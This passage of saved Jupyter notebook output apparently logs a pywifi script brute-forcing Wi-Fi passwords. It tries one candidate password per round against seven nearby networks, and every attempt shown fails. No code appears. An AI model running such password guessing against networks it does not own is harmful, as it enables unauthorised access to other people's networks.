     "output_type": "stream",
     "text": [
      "num= 33 Fail Current WifiName: 321sushe Current Password: 8329129lBx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:53,316 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 33 Fail Current WifiName: 313 Current Password: 8329129lBx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:04:58,894 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 34 Fail Current WifiName: BP2197 Current Password: uIF46329\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:04,470 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 34 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: uIF46329\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:10,045 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 34 Fail Current WifiName: whhh Current Password: uIF46329\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:15,061 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 34 Fail Current WifiName: Ruoshui317 Current Password: uIF46329\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:20,644 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 34 Fail Current WifiName: 311 Current Password: uIF46329\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:26,222 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 34 Fail Current WifiName: 321sushe Current Password: uIF46329\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:31,796 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 34 Fail Current WifiName: 313 Current Password: uIF46329\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:37,370 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 35 Fail Current WifiName: BP2197 Current Password: 20648470LH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:42,940 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 35 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 20648470LH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:48,514 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 35 Fail Current WifiName: whhh Current Password: 20648470LH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:53,538 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 35 Fail Current WifiName: Ruoshui317 Current Password: 20648470LH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:05:59,110 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 35 Fail Current WifiName: 311 Current Password: 20648470LH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:04,684 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 35 Fail Current WifiName: 321sushe Current Password: 20648470LH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:10,259 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 35 Fail Current WifiName: 313 Current Password: 20648470LH\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:15,838 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 36 Fail Current WifiName: BP2197 Current Password: kJl7168253\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:21,414 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 36 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: kJl7168253\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:26,986 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 36 Fail Current WifiName: whhh Current Password: kJl7168253\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:32,006 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 36 Fail Current WifiName: Ruoshui317 Current Password: kJl7168253\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:37,573 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 36 Fail Current WifiName: 311 Current Password: kJl7168253\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:43,145 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 36 Fail Current WifiName: 321sushe Current Password: kJl7168253\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:48,719 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 36 Fail Current WifiName: 313 Current Password: kJl7168253\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:54,291 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 37 Fail Current WifiName: BP2197 Current Password: 72155583VU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:06:59,865 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 37 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 72155583VU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:05,440 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 37 Fail Current WifiName: whhh Current Password: 72155583VU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:10,461 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 37 Fail Current WifiName: Ruoshui317 Current Password: 72155583VU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:16,039 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 37 Fail Current WifiName: 311 Current Password: 72155583VU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:21,614 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 37 Fail Current WifiName: 321sushe Current Password: 72155583VU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:27,197 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 37 Fail Current WifiName: 313 Current Password: 72155583VU\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:32,767 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 38 Fail Current WifiName: BP2197 Current Password: fHS86837175\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:38,332 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 38 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: fHS86837175\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:43,906 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 38 Fail Current WifiName: whhh Current Password: fHS86837175\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:48,920 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 38 Fail Current WifiName: Ruoshui317 Current Password: fHS86837175\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:07:54,495 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 38 Fail Current WifiName: 311 Current Password: fHS86837175\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:00,073 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 38 Fail Current WifiName: 321sushe Current Password: fHS86837175\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:05,648 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 38 Fail Current WifiName: 313 Current Password: fHS86837175\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:11,223 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 40 Fail Current WifiName: BP2197 Current Password: EWh74699\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:16,796 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 40 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: EWh74699\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:22,361 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 40 Fail Current WifiName: whhh Current Password: EWh74699\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:27,381 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 40 Fail Current WifiName: Ruoshui317 Current Password: EWh74699\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:32,950 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 40 Fail Current WifiName: 311 Current Password: EWh74699\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:38,521 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 40 Fail Current WifiName: 321sushe Current Password: EWh74699\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:44,091 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 40 Fail Current WifiName: 313 Current Password: EWh74699\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:49,667 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 41 Fail Current WifiName: BP2197 Current Password: 923579Tpq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:08:55,241 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 41 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 923579Tpq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:00,814 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 41 Fail Current WifiName: whhh Current Password: 923579Tpq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:05,828 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 41 Fail Current WifiName: Ruoshui317 Current Password: 923579Tpq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:11,399 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 41 Fail Current WifiName: 311 Current Password: 923579Tpq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:16,973 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 41 Fail Current WifiName: 321sushe Current Password: 923579Tpq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:22,538 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 41 Fail Current WifiName: 313 Current Password: 923579Tpq\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:28,111 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 42 Fail Current WifiName: BP2197 Current Password: FS30667020\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:33,681 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 42 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: FS30667020\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:39,261 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 42 Fail Current WifiName: whhh Current Password: FS30667020\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:44,283 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 42 Fail Current WifiName: Ruoshui317 Current Password: FS30667020\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:49,864 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 42 Fail Current WifiName: 311 Current Password: FS30667020\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:09:55,445 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 42 Fail Current WifiName: 321sushe Current Password: FS30667020\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:01,021 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 42 Fail Current WifiName: 313 Current Password: FS30667020\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:06,602 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 43 Fail Current WifiName: BP2197 Current Password: 9430991oS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:12,173 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 43 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 9430991oS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:17,748 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 43 Fail Current WifiName: whhh Current Password: 9430991oS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:22,770 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 43 Fail Current WifiName: Ruoshui317 Current Password: 9430991oS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:28,347 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 43 Fail Current WifiName: 311 Current Password: 9430991oS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:33,922 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 43 Fail Current WifiName: 321sushe Current Password: 9430991oS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:39,496 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 43 Fail Current WifiName: 313 Current Password: 9430991oS\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:45,081 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 44 Fail Current WifiName: BP2197 Current Password: Rtp269997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:50,658 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 44 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: Rtp269997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:10:56,232 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 44 Fail Current WifiName: whhh Current Password: Rtp269997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:01,247 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 44 Fail Current WifiName: Ruoshui317 Current Password: Rtp269997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:06,829 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 44 Fail Current WifiName: 311 Current Password: Rtp269997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:12,403 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 44 Fail Current WifiName: 321sushe Current Password: Rtp269997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:17,973 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 44 Fail Current WifiName: 313 Current Password: Rtp269997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:23,543 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 45 Fail Current WifiName: BP2197 Current Password: 5729701SL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:29,117 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 45 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 5729701SL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:34,691 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 45 Fail Current WifiName: whhh Current Password: 5729701SL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:39,709 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 45 Fail Current WifiName: Ruoshui317 Current Password: 5729701SL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:45,280 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 45 Fail Current WifiName: 311 Current Password: 5729701SL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:50,869 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 45 Fail Current WifiName: 321sushe Current Password: 5729701SL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:11:56,445 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 45 Fail Current WifiName: 313 Current Password: 5729701SL\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:02,017 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 46 Fail Current WifiName: BP2197 Current Password: xTw63249\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:07,590 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 46 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: xTw63249\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:13,161 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 46 Fail Current WifiName: whhh Current Password: xTw63249\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:18,184 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 46 Fail Current WifiName: Ruoshui317 Current Password: xTw63249\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:23,753 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 46 Fail Current WifiName: 311 Current Password: xTw63249\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:29,323 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 46 Fail Current WifiName: 321sushe Current Password: xTw63249\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:34,896 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 46 Fail Current WifiName: 313 Current Password: xTw63249\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:40,478 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 47 Fail Current WifiName: BP2197 Current Password: 4078350dkN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:46,071 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 47 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 4078350dkN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:51,640 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 47 Fail Current WifiName: whhh Current Password: 4078350dkN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:12:56,659 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 47 Fail Current WifiName: Ruoshui317 Current Password: 4078350dkN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:02,232 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 47 Fail Current WifiName: 311 Current Password: 4078350dkN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:07,806 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 47 Fail Current WifiName: 321sushe Current Password: 4078350dkN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:13,374 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 47 Fail Current WifiName: 313 Current Password: 4078350dkN\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:18,947 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 48 Fail Current WifiName: BP2197 Current Password: pap844718\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:24,520 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 48 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: pap844718\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:30,091 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 48 Fail Current WifiName: whhh Current Password: pap844718\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:35,112 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 48 Fail Current WifiName: Ruoshui317 Current Password: pap844718\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:40,686 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 48 Fail Current WifiName: 311 Current Password: pap844718\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:46,256 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 48 Fail Current WifiName: 321sushe Current Password: pap844718\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:51,832 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 48 Fail Current WifiName: 313 Current Password: pap844718\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:13:57,406 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 49 Fail Current WifiName: BP2197 Current Password: 000440Zod\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 00:14:02,978 ERROR Open handle failed!\n"
     ]
    },
    {
